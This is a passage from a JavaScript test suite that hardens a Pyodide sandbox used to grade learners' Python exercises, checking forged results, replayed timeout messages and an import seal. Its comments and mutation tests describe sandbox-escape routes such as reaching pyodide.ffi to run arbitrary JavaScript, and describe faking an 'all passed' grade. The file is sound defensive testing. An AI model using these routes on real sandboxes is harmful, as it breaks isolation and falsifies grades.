    'the forged "all passed" outcome must not have been believed');
  assert.equal(result.ok, true, 'the learner code itself runs fine — only its check fails');
  assert.equal(result.stdout, 'real run\n', 'and the forged stdout must not have been believed either');
});

caseOf('a replayed loading cannot reset the execution clock', async host => {
  const box = createFacade(host);
  // A short execution budget, and the genuine reply held forever, so the run
  // can only end one way: the execution timeout firing.
  const BUDGET = 400;
  const sandbox = box.api.create({ timeoutMs: BUDGET });
  const release = box.holdResults();
  const started = Date.now();
  let settled = null;
  const running = sandbox.run({ code: 'pass\n', checks: [{ kind: 'stdout_contains', value: 'x', weight: 1 }] })
    .then(value => { settled = value; return value; });

  const worker = await new Promise(resolve => {
    const tick = () => (box.Worker.last && box.Worker.last.sent ? resolve(box.Worker.last) : setTimeout(tick, 5));
    tick();
  });
  const nonce = worker.sent.nonce;

  // The real worker's own `loading`, replayed over and over, each carrying the
  // valid nonce. The nonce rides the wire, so this is exactly what an attacker
  // who can reach postMessage is able to send.
  //
  // Replayed for much LONGER than the budget on purpose. Honouring a second
  // `loading` clears the running execution timer and starts a fresh one, so a
  // facade that accepts the replay simply cannot time out until the attacker
  // stops: the deadline keeps moving to "now + budget". This case stops
  // replaying after a fixed window and then asserts the run died on schedule.
  const replayUntil = started + BUDGET * 4;
  while (Date.now() < replayUntil && !settled) {
    worker.forge({ type: 'loading', nonce });
    await new Promise(resolve => setTimeout(resolve, 20));
  }

  const result = await running;
  release();
  const elapsed = Date.now() - started;
  assert.equal(result.reason, 'timeout',
    `the run must still time out, got reason=${result.reason} elapsed=${elapsed}ms`);
  assert.ok(elapsed < BUDGET * 2,
    `replayed loading messages must not restart the execution clock: ${elapsed}ms elapsed on a ${BUDGET}ms budget`);
});

caseOf('a real run passes every check kind on the real runtime', async host => {
  const box = createFacade(host);
  const sandbox = box.api.create({});
  const result = await sandbox.run({
    code: 'name = "Ada"\nrole = "Agent"\nscore = 7\nprint(f"I am {name}, I want to learn {role}")\n',
    checks: [
      { kind: 'stdout_matches', pattern: 'I am [\\s\\S]{1,20},\\s*I want to learn\\s*[^\\s]', weight: 6 },
      { kind: 'assert_python', code: 'assert isinstance(name, str) and name.strip()', weight: 2 },
      { kind: 'var_equals', name: 'name', value: 'Ada', weight: 2 },
      { kind: 'var_in_range', name: 'score', min: 5, max: 10, weight: 1 },
      { kind: 'stdout_contains', value: 'I am Ada', weight: 3 },
      { kind: 'output_choice', correct: ['A', 'B'], weight: 1 },
    ],
    answer: ['A', 'B'],
  });
  assert.equal(result.ok, true, `the exercise failed: ${result.error}`);
  assert.deepEqual(result.outcomes.map(one => one.ok), [true, true, true, true, true, true]);
  assert.deepEqual(result.values.name, 'Ada');
  assert.deepEqual(result.values.score, 7);
});

caseOf('a crash inside learner code is reported, not swallowed', async host => {
  const box = createFacade(host);
  const sandbox = box.api.create({});
  const result = await sandbox.run({
    code: 'print("before")\nraise ValueError("boom")\n',
    checks: [{ kind: 'stdout_contains', value: 'before', weight: 1 }],
  });
  assert.equal(result.ok, false);
  assert.match(result.error, /ValueError: boom/);
  assert.equal(result.stdout, 'before\n');
});

caseOf('a stale global does not survive into the next run on the real runtime', async host => {
  const box = createFacade(host);
  const sandbox = box.api.create({});
  await sandbox.run({ code: 'total = 5\n_secret = 9\n', checks: [] });
  const second = await sandbox.run({
    code: 'pass\n',
    checks: [
      { kind: 'var_equals', name: 'total', value: 5, weight: 1 },
      { kind: 'var_equals', name: '_secret', value: 9, weight: 1 },
    ],
  });
  assert.deepEqual(second.outcomes.map(one => one.ok), [false, false],
    'nothing from the previous run may satisfy this run');
});

/* ------------------------------------------------------------------ corpus -- */

caseOf('every corpus reference scores the same on the real runtime', async host => {
  const items = harnessVerdicts();
  assert.ok(items.length >= 9, `expected the frozen corpus, found ${items.length}`);
  let compared = 0;
  for (const entry of items) {
    const { item, where, expected, problem } = entry;
    const checks = item.checks || [];
    const { result } = await host.run({ code: item.reference || '', checks });
    assert.equal(result.outcomes.length, checks.length,
      `${where}: outcomes must stay aligned with checks`);

    if (problem) {
      // The harness refuses a reference that raises or needs the starter: it
      // reports the reference as a failure and produces NO per-check verdicts.
      // The worker's route to the same verdict is __sils_ok = False, which
      // blanks every sandbox check. stdout_* checks are the documented
      // exception -- the worker grades the output printed before the crash,
      // while the harness reports the whole reference as failed.
      for (const [index, one] of result.outcomes.entries()) {
        if (['assert_python', 'var_equals', 'var_in_range'].includes(checks[index].kind)) {
          assert.equal(one.ok, false,
            `${where}: a crashed run must score zero on a sandbox check (harness: ${problem})`);
        }
      }
      continue;
    }

    // THE ACTUAL COMPARISON. Every check the harness graded, item by item.
    // The previous version of this case read `if (result.ok) continue;`, and
    // since all 18 references score 100% that skipped every one of them -- the
    // case asserted only that outcomes.length matched, despite its name
    // promising the runtime and the harness agree on scores.
    assert.equal(result.ok, true,
      `${where}: the worker must run this reference cleanly (${result.error || 'raised'})`);
    for (const [index, one] of result.outcomes.entries()) {
      assert.equal(one.ok, expected[index],
        `${where}: check ${index} (${checks[index].kind}) — real Pyodide says ` +
        `${one.ok}, the harness says ${expected[index]}; ${JSON.stringify(checks[index]).slice(0, 200)}`);
      compared += 1;
    }
  }
  assert.ok(compared >= 90,
    `expected the harness verdicts to be compared item by item, only compared ${compared}`);
});

/* The harness's OWN verdict for every corpus reference, one boolean per check.

   Computed by importing scripts/check_exercise_references.py -- the same module
   scripts/test-exercise-worker.cjs probes -- and calling its own solve() and
   outcome(), so "the runtime and the harness agree" is a comparison against the
   harness rather than a second opinion written by this file. Checks the harness
   leaves ungraded (output_choice, self_assessed: they need a learner answer the
   harness has no way to supply) come back as null and are compared against the
   worker's fail-closed 'not evaluated' instead. */
function harnessVerdicts() {
  const probe = `
import json, sys
from pathlib import Path
sys.path.insert(0, str(Path(sys.argv[1]).resolve()))
import check_exercise_references as H
items = []
for lang, where, item in H.executable_items():
    if item['type'] not in H.EXECUTABLE_TYPES:
        continue
    mode, stdout, namespace, problem = H.solve(item)
    expected = []
    if problem is None:
        for check in (item.get('checks') or []):
            outcome = H.outcome(check, stdout, namespace)
            expected.append(False if outcome is None else bool(outcome))
    items.append({
        'where': where,
        'problem': problem,
        'expected': expected,
        'item': {k: item.get(k) for k in ('id', 'type', 'checks', 'reference')},
    })
print(json.dumps(items))
`;
  const run = spawnSync(PYTHON, ['-X', 'utf8', '-c', probe, path.join(ROOT, 'scripts')], {
    encoding: 'utf8', maxBuffer: 64 * 1024 * 1024,
  });
  if (run.status !== 0) throw new Error(`harness probe failed: ${String(run.stderr || '').trim()}`);
  return JSON.parse(run.stdout);
}

/* ---------------------------------------------------------------- mutations -- */

/* Every layer of the seal has to be locked by a case that fails when the layer
   is removed. A green suite proves nothing on its own, and the previous version
   of this file left two of the layers unpinned: deleting either kept every test
   green, because the layer that survived happened to cover the same routes.

   Each mutation below edits the SHIPPED worker source, boots a real runtime
   from it, and re-runs one case. `SILS_SKIP_MUTATIONS=1` skips them: each boots
   a Pyodide instance, which is the expensive part of this file.

   The mutation list is deliberately NOT the same as the list of things the
   seal does. One step was REMOVED because a mutation test proved it redundant:
   hardening the emptied dict in place (`live.__class__ = _sils_SealedBridgeTable`).
   With the instance attribute popped and the pin on the class, the suite stayed
   green without it, so it was deleted from the worker rather than kept as
   decoration. Two further limits are recorded rather than asserted as routes:

     * dict.__setitem__ still writes through the override -- what it yields is a
       learner-chosen PYTHON value, never a JavaScript object, so it is
       asserted as inertness rather than as a blocked route;
     * a learner CAN `del JsFinder.jsproxies` (it is a plain class attribute and
       Python has no way to make it private). Layer A is what still stops them,
       and the hollow-proxy check asserts the outcome. */
const MUTATIONS = [
  {
    name: 'layer A: the baseline filter',
    expect: 'each layer of the import seal is load-bearing on its own',
    why: 'with the filter gone, _sils_ORIGINAL keeps the JsFinder, so the live '
      + 'bridge finder is back on sys.meta_path',
    from: [
      '    if _sils_serves_bridge(_sils_f):',
      '        _sils_empty_bridge(_sils_f)',
      '    else:',
      '        _sils_KEPT.append(_sils_f)',
    ].join('\n'),
    to: [
      '    if _sils_serves_bridge(_sils_f):',
      '        _sils_empty_bridge(_sils_f)',
      '    _sils_KEPT.append(_sils_f)',
    ].join('\n'),
  },
  {
    name: 'layer B: the per-run re-pin',
    expect: 'each layer of the import seal is load-bearing on its own',
    why: 'with the re-pin gone, a table dirtied in run 1 is still live in run 2, '
      + 'because learner code runs BETWEEN runs',
    from: '    _sils_pin_bridge()\n',
    to: '',
  },
  {
    name: 'the class-level pin',
    expect: 'each layer of the import seal is load-bearing on its own',
    why: 'pinning only the instance lets a freshly constructed JsFinder() be '
      + 'born open, and the class __init__ assigns self.jsproxies = {}',
    from: [
      '        from _pyodide._importhook import JsFinder as _sils_JsFinder',
      '        _sils_JsFinder.jsproxies = property(',
      '            lambda _sils_self: _sils_TABLE,',
      '            lambda _sils_self, _sils_value: _sils_TABLE._sils_deny(_sils_self),',
      '        )',
    ].join('\n'),
    to: '        pass',
  },
  {
    name: 'the bridge names in the import seal',
    expect: 'the proxy factory is sealed on every route into it',
    why: 'with pyodide.ffi and friends no longer sealed, create_proxy is '
      + 'reachable again and arbitrary JavaScript runs',
    from: "_sils_BRIDGE | frozenset((\n    'pyodide.ffi', '_pyodide_core', '_pyodide._core_docs',\n    'pyodide.code', 'pyodide.webloop',\n))",
    to: '_sils_BRIDGE',
  },
  {
    name: 'the prefix match on sealed names',
    expect: 'the proxy factory is sealed on every route into it',
    why: 'matching only the first component lets `pyodide.ffi` through, because '
      + "the first component of 'pyodide.ffi' is 'pyodide'",
    from: "        if _sils_name == _sils_entry or _sils_name.startswith(_sils_entry + '.'):",
    to: '        if _sils_name.split(".")[0] == _sils_entry:',
  },
  {
    name: 'the attribute cleanup on the pyodide package',
    expect: 'the proxy factory is sealed on every route into it',
    why: 'without it, `import pyodide; pyodide.ffi` reads the attribute straight '
      + 'off the module without ever consulting sys.meta_path',
    from: "            ('pyodide', ('ffi', 'code', 'webloop')),",
    to: "            ('pyodide', ()),",
  },
];

async function runMutations() {
  if (process.env.SILS_SKIP_MUTATIONS === '1') {
    console.log('  skip  SILS_SKIP_MUTATIONS=1');
    return 0;
  }
  const original = fs.readFileSync(WORKER, 'utf8');
  let failures = 0;
  for (const mutation of MUTATIONS) {
    if (!original.includes(mutation.from)) {
      console.error(`  FAIL mutation "${mutation.name}" does not apply -- the worker source moved`);
      failures += 1;
      continue;
    }
    const mutated = original.replace(mutation.from, mutation.to);
    assert.notEqual(mutated, original, `mutation "${mutation.name}" must change the source`);

    // A fresh host per mutation: each boots its own real Pyodide, because the
    // seal mutates interpreter state that cannot be rewound inside one session.
    const host = createRealHost(mutated);
    const target = CASES.find(([name]) => name === mutation.expect);
    assert.ok(target, `no case named ${mutation.expect} to re-run`);
    try {
      await target[1](host);
      console.error(`  FAIL the suite stayed green without ${mutation.name} -- that layer is not locked\n`
        + `       ${mutation.why}`);
      failures += 1;
    } catch (error) {
      console.log(`  ok    without ${mutation.name}, "${mutation.expect}" fails`);
    }
  }
  return failures;
}

/* -------------------------------------------------------------------- main -- */

async function main() {
  if (process.env.SILS_REAL_PYODIDE === '0') {
    console.log('ExerciseSandboxReal\n  skip  SILS_REAL_PYODIDE=0');
    console.log('\nSKIP: real Pyodide checks were not run');
    return;
  }
  console.log('ExerciseSandboxReal');
  let failures = 0;
  // ONE host for the whole run: booting the runtime is the expensive part, and
  // sharing it means each case inherits the state the previous one left, which
  // is what a real long-lived worker does.
  const host = createRealHost();

  for (const [name, fn] of CASES) {
    try {
      await fn(host);
      console.log(`  ok  ${name}`);
    } catch (error) {
      failures += 1;
      console.error(`  FAIL ${name}\n       ${error.message}`);
    }
  }

  console.log('ExerciseSandboxReal mutations');
  failures += await runMutations();

  if (failures) {
    console.error(`\n${failures} failing`);
    process.exit(1);
  }
  console.log('\nPASS: the sandbox holds against a real Pyodide runtime');
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});
